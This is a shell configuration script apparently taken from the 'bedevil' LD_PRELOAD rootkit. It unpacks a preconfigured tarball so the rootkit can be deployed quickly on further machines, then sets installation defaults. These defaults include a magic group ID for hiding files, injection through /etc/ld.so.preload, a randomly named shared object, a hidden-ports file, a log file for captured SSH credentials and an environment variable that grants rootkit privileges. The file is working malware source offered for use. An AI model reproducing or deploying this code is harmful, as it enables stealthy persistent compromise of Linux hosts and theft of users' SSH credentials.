# default values for settings. (can/will be changed later...)

if [ ! -z $TARBALL ]; then
    # this addition to the rootkit is an effort to decrease the amount of
    # time that it can potentially take to deploy bedevil. configure it once
    # on your host box, and use the same tarball on other machines to deploy
    # bedevil at a much greater speed than usual. (wget, curl, scp, ...)
    if [ -f $TARBALL ] && [[ $TARBALL == *".tar.gz" ]]; then
        [ ! -f `bin_path tar` ] && { eecho "Couldn't locate 'tar' on this machine."; exit; }
        secho "Have $TARBALL, beginning extraction"
        tar xpfz $TARBALL && \
            secho "Finished extraction successfully" || \
            { eecho "Failure extracting" && exit; }
        NEW_MDIR="`tar -tzf $TARBALL | head -1 | cut -f1 -d"/"`"
        necho "Reading settings from $NEW_MDIR/settings"
        read_defaults $NEW_MDIR/settings
    else
        eecho "No tarball found. ($TARBALL)"
        exit
    fi
fi

  #  if 'defaults' are already set before this file has been sourced,
  #  these variables will remain what they were previously set to.

[ -z $DIRDEPTH ] && DIRDEPTH=2

[ -z $MAGIC_GID ] && MAGIC_GID=`random '1-9' 3`               # GID used to hide things.
[ -z $INSTALL_DIR ] && INSTALL_DIR="`random_path $DIRDEPTH`"  # installation directory.
[ -z $LDSO_PRELOAD ] && LDSO_PRELOAD="/etc/ld.so.preload"     # preload file location.
[ -z $BDVLSO ] && BDVLSO="lib`random_name`.so"                # name of rootkit shared object.
[ -z $SOPATH ] && SOPATH="$INSTALL_DIR/$BDVLSO.\$PLATFORM"    # where the rootkit lives.

[ -z $HIDEPORTS ] && HIDEPORTS="`random_path $DIRDEPTH`"  # file to read hidden ports from.
[ -z $SSH_LOGS ] && SSH_LOGS="`random_path $DIRDEPTH`"              # ssh credentials log file.
[ -z $INTEREST_DIR ] && INTEREST_DIR="`random_path $DIRDEPTH`"      # where interesting files live.
[ -z $BD_VAR ] && BD_VAR="`random 'A-Z' 9`"                         # environment variable to grant rk perms.

[ -z $MDIR ] && MDIR="inc"                      # default include directory...
[ -z $NEW_MDIR ] && NEW_MDIR="${BDVLSO}.$MDIR"  # new include directory...

[ -z $BDVL_H ] && BDVL_H="$NEW_MDIR/bedevil.h"  # location of header to write to.
[ -z $PLATFORM ] && PLATFORM="`uname -m`"       # machine's platform identifier.

# files to copy to install dir upon configuration de la maison
declare -a array COPY_FILES=(.ascii etc/BD_README etc/.bashrc)